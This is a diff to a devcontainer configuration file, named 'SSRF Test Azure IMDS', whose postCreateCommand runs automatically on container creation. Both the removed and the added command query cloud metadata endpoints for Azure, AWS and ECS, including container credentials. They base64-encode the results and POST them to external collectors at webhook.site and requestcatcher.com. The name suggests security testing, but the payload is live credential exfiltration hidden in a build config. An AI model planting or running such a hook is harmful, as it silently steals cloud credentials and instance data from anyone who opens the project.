@@ -1,8 +1,8 @@
 {
-  "name": "SSRF Test 2026 v3",
+  "name": "SSRF Test Azure IMDS",
   "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
   "features": {
     "ghcr.io/devcontainers/features/common-utils:2": {}
   },
-  "postCreateCommand": "curl -X POST -d \"imds=$(curl -s http://169.254.169.254/latest/meta-data/ 2>&1 | base64 -w0)\" http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/imds-full-exfil || curl -X POST -d \"azure=$(curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>&1 | base64 -w0)\" http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/azure-imds-exfil || curl http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/postcreate-ran"
+  "postCreateCommand": "IMDS_RAW=$(curl -s -w '\\n---HTTP_CODE:%{http_code}---' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' -H 'Metadata: true' 2>&1); curl -X POST -d \"azure_imds=$(echo $IMDS_RAW | base64 -w0)\" https://ssrf-exfil.requestcatcher.com/azure-imds; AWS_IMDS=$(curl -s http://169.254.169.254/latest/meta-data/ 2>&1); curl -X POST -d \"aws_imds=$(echo $AWS_IMDS | base64 -w0)\" https://ssrf-exfil.requestcatcher.com/aws-imds; ECS_CREDS=$(curl -s http://169.254.170.2/v2/credentials 2>&1); curl -X POST -d \"ecs=$(echo $ECS_CREDS | base64 -w0)\" https://ssrf-exfil.requestcatcher.com/ecs-creds"
 }
